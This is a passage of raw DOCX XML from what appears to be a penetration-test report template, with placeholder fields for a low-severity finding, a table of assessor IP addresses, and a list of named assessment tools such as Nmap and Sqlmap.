                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Name_Function]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="35CAEAFD" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="3F5FE609" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>AFFECTED URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5D08CDC5" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Url]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="4BDA67EB" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="44A5BF61" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>PARAMETER</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="25ABD36B" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.Parameter]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="4698D0B5" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="14D1771E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CONDITION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="42D37E15" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>.Vuln.</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Condition</w:t>
            </w:r>
            <w:r w:rsidRPr="00957D8C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6F8B8ADD" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="575B3BB1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGridLight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327"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="09FCB857" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="620DD56F" w14:textId="6E6511E5" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VulnDetails.Name]]:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47C1DEE3" w14:textId="774E87A5" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VulnDetails.Data]]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="739082F4" w14:textId="6FCD18BC" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VulnDetails.image-Image]:from-resource:maxSize(15)]</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F389216" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809"/>
    <w:p w14:paraId="78491D78" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27FC8FBD" w14:textId="77777777" w:rsidR="00B25F11" w:rsidRDefault="00B25F11" w:rsidP="00B25F11"/>
    <w:p w14:paraId="1F2304FA" w14:textId="77777777" w:rsidR="00DD3157" w:rsidRDefault="008E31DD" w:rsidP="00DD3157">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="20" w:name="_Toc449697705"/>
      <w:bookmarkStart w:id="21" w:name="_Toc34146504"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>APPENDIX</w:t>
      </w:r>
      <w:r w:rsidR="005D1C47">
        <w:t xml:space="preserve"> A: </w:t>
      </w:r>
      <w:bookmarkEnd w:id="20"/>
      <w:r>
        <w:rPr>
          <w:caps w:val="0"/>
        </w:rPr>
        <w:t>ASSESSMENT INFORMATION</w:t>
      </w:r>
      <w:bookmarkEnd w:id="21"/>
    </w:p>
    <w:p w14:paraId="1D82B0F5" w14:textId="77777777" w:rsidR="007B584C" w:rsidRDefault="007B584C" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="_Toc34146505"/>
      <w:bookmarkStart w:id="23" w:name="_Toc445395815"/>
      <w:bookmarkEnd w:id="11"/>
      <w:r>
        <w:t>LIST OF IP DOING ASSESSMENT</w:t>
      </w:r>
      <w:bookmarkEnd w:id="22"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent110"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="645"/>
        <w:gridCol w:w="3789"/>
        <w:gridCol w:w="4913"/>
      </w:tblGrid>
      <w:tr w:rsidR="007B584C" w14:paraId="479999A0" w14:textId="77777777" w:rsidTr="00011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39CB5B14" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00E84C31" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3789" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4971F152" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00E84C31" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>TIMELINE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4913" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3343B593" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00E84C31" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>IP ADDRESS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w14:paraId="2187F5E2" w14:textId="77777777" w:rsidTr="00011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AA76511" w14:textId="77777777" w:rsidR="007B584C" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3789" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="32DD2421" w14:textId="77777777" w:rsidR="007B584C" w:rsidRDefault="0001157D" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>[[Project.time]:unprocessed]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4913" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="68BFCF7E" w14:textId="77777777" w:rsidR="007B584C" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00CF5A58">
              <w:t>101.99.33.201</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="007B584C" w14:paraId="0E66A269" w14:textId="77777777" w:rsidTr="0001157D">
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="645" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="77F0A229" w14:textId="77777777" w:rsidR="007B584C" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:jc w:val="center"/>
            </w:pPr>
            <w:r>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3789" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6589EE89" w14:textId="77777777" w:rsidR="007B584C" w:rsidRDefault="0001157D" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r>
              <w:t>[[Project.time]]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4913" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7790F07B" w14:textId="77777777" w:rsidR="007B584C" w:rsidRPr="00CF5A58" w:rsidRDefault="007B584C" w:rsidP="00D21C2E">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            </w:pPr>
            <w:r w:rsidRPr="00055194">
              <w:t>115.165.164.30</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="12715636" w14:textId="77777777" w:rsidR="003E237F" w:rsidRDefault="008E31DD" w:rsidP="007476B7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc34146506"/>
      <w:r>
        <w:t>LIST OF TOOLS</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="GridTable4-Accent1100"/>
        <w:tblW w:w="5000" w:type="pct"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="722"/>
        <w:gridCol w:w="2232"/>
        <w:gridCol w:w="6619"/>
      </w:tblGrid>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="085DB880" w14:textId="77777777" w:rsidTr="00AA44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7" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="210514B6" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>No.</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5AF83B58" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="000985C6" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:cnfStyle w:val="100000000000" w:firstRow="1" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:b w:val="0"/>
                <w:bCs w:val="0"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>TOOLS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="7546EA02" w14:textId="77777777" w:rsidTr="00AA4467">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77" w:type="pct"/>
            <w:vMerge w:val="restart"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0E7BC97E" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t> 1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:vMerge w:val="restart"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3DED9061" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Open-Source tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DC8A3F6" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000100000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="1" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Nmap, Firefox addons, Grabber, Zed, Sqlmap, WebScarab, Wireshark and other tool in Kali Linux (advanced penetration testing platform)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="2B91D23D" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="288"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:cnfStyle w:val="001000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
            <w:tcW w:w="377" w:type="pct"/>
            <w:vMerge/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C8C402B" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:vMerge/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B868BC2" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3457" w:type="pct"/>
            <w:noWrap/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23AC7F06" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:cnfStyle w:val="000000000000" w:firstRow="0" w:lastRow="0" w:firstColumn="0" w:lastColumn="0" w:oddVBand="0" w:evenVBand="0" w:oddHBand="0" w:evenHBand="0" w:firstRowFirstColumn="0" w:firstRowLastColumn="0" w:lastRowFirstColumn="0" w:lastRowLastColumn="0"/>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="003A3EC4">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t xml:space="preserve">Framework scanner: </w:t>
            </w:r>
            <w:r w:rsidRPr="0096358F">
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
              <w:t>Microsoft ASP.NET</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005629E3" w:rsidRPr="001D558C" w14:paraId="7329361F" w14:textId="77777777" w:rsidTr="00AA4467">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77" w:type="pct"/>
            <w:vMerge/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="143B2576" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1166" w:type="pct"/>
            <w:vMerge/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C18D54B" w14:textId="77777777" w:rsidR="005629E3" w:rsidRPr="001D558C" w:rsidRDefault="005629E3" w:rsidP="00AA4467">
            <w:pPr>
